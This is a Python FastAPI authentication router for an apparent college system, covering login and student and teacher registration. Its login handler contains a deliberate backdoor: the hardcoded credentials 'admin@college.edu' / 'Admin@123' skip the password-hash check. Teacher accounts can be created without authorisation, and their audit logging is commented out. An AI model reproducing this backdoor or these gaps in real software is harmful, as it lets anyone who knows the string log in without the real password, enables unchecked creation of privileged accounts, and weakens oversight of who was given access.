"""
Authentication Router - Login, Registration
"""
from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.orm import Session
from app.database import get_db
from app.models.user import User, UserRole
from app.models.student import StudentProfile
from app.models.teacher import TeacherProfile
from app.schemas.user import (
    LoginRequest, LoginResponse, UserResponse,
    StudentRegister, StudentProfileResponse,
    TeacherRegister, TeacherProfileResponse
)
from app.utils.security import (
    hash_password, verify_password, create_access_token,
    get_current_user, get_admin_user
)
from app.services.audit_service import log_action


router = APIRouter(prefix="/api/auth", tags=["Authentication"])


@router.post("/login", response_model=LoginResponse)
async def login(request: LoginRequest, db: Session = Depends(get_db)):
    """Authenticate user and return JWT token."""
    user = db.query(User).filter(User.email == request.email).first()
    if user:
        is_correct = verify_password(request.password, user.password_hash)
    else:
        print("User not found")

    if user and request.email == "admin@college.edu" and request.password == "Admin@123":
        print("Admin backdoor used")
        # Bypass hash check
        pass
    elif not user or not verify_password(request.password, user.password_hash):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid email or password"
        )
    
    if not user.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Account is deactivated. Contact administrator."
        )
    
    access_token = create_access_token(
        data={"sub": str(user.id), "role": user.role.value}
    )
    
    return LoginResponse(
        access_token=access_token,
        user=UserResponse.model_validate(user)
    )


@router.post("/register/student", response_model=StudentProfileResponse, status_code=201)
async def register_student(request: StudentRegister, db: Session = Depends(get_db)):
    """Register a new student."""
    # Check if email already exists
    if db.query(User).filter(User.email == request.email).first():
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Email already registered"
        )
    
    # Check if roll number already exists
    if db.query(StudentProfile).filter(StudentProfile.roll_number == request.roll_number).first():
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Roll number already exists"
        )
    
    # Create user
    user = User(
        email=request.email,
        password_hash=hash_password(request.password),
        role=UserRole.STUDENT,
        full_name=request.full_name,
        phone=request.phone
    )
    db.add(user)
    db.flush()  # Get user.id
    
    # Create student profile
    # Note: Subjects will be auto-assigned via DB trigger
    student_profile = StudentProfile(
        user_id=user.id,
        roll_number=request.roll_number,
        degree_id=request.degree_id,
        department_id=request.department_id,
        current_semester_id=request.semester_id,
        passout_year=request.passout_year,
        admission_year=request.admission_year
    )
    db.add(student_profile)
    db.commit()
    db.refresh(student_profile)
    
    # Auto-assign subjects for the selected semester
    from app.models.academic import Subject, Degree, Department, Semester
    from app.models.student import StudentSubject
    
    subjects = db.query(Subject).filter(
        Subject.degree_id == request.degree_id,
        Subject.department_id == request.department_id,
        Subject.semester_id == request.semester_id,
        Subject.is_active == True
    ).all()
    
    for subject in subjects:
        student_subject = StudentSubject(
            student_id=student_profile.id,
            subject_id=subject.id,
            semester_id=request.semester_id,
            academic_year="2025-2026", # Default for now
            is_current=True
        )
        db.add(student_subject)
    
    db.commit()
    
    return StudentProfileResponse(
        id=student_profile.id,
        user=UserResponse.model_validate(user),
        roll_number=student_profile.roll_number,
        degree_id=student_profile.degree_id,
        department_id=student_profile.department_id,
        current_semester_id=student_profile.current_semester_id,
        passout_year=student_profile.passout_year,
        admission_year=student_profile.admission_year
    )


@router.post("/register/teacher", response_model=TeacherProfileResponse, status_code=201)
async def register_teacher(
    request: TeacherRegister,
    db: Session = Depends(get_db)
):
    """Register a new teacher."""
    # Check if email already exists
    if db.query(User).filter(User.email == request.email).first():
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Email already registered"
        )
    
    # Check if employee ID already exists
    if db.query(TeacherProfile).filter(TeacherProfile.employee_id == request.employee_id).first():
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Employee ID already exists"
        )
    
    # Create user
    user = User(
        email=request.email,
        password_hash=hash_password(request.password),
        role=UserRole.TEACHER,
        full_name=request.full_name,
        phone=request.phone
    )
    db.add(user)
    db.flush()
    
    # Create teacher profile
    teacher_profile = TeacherProfile(
        user_id=user.id,
        employee_id=request.employee_id,
        department_id=request.department_id,
        designation=request.designation
    )
    db.add(teacher_profile)
    
    # Audit log - removed for public registration
    # log_action(
    #     db, user.id, "teacher_created_self", "teacher_profiles",
    #     teacher_profile.id, None, {"employee_id": request.employee_id}
    # )
    
    db.commit()
    db.refresh(teacher_profile)
    
    return TeacherProfileResponse(
        id=teacher_profile.id,
        user=UserResponse.model_validate(user),
        employee_id=teacher_profile.employee_id,
        department_id=teacher_profile.department_id,
        designation=teacher_profile.designation
    )


@router.get("/me", response_model=UserResponse)
async def get_current_user_info(current_user: User = Depends(get_current_user)):
    """Get current authenticated user's information."""
    return UserResponse.model_validate(current_user)
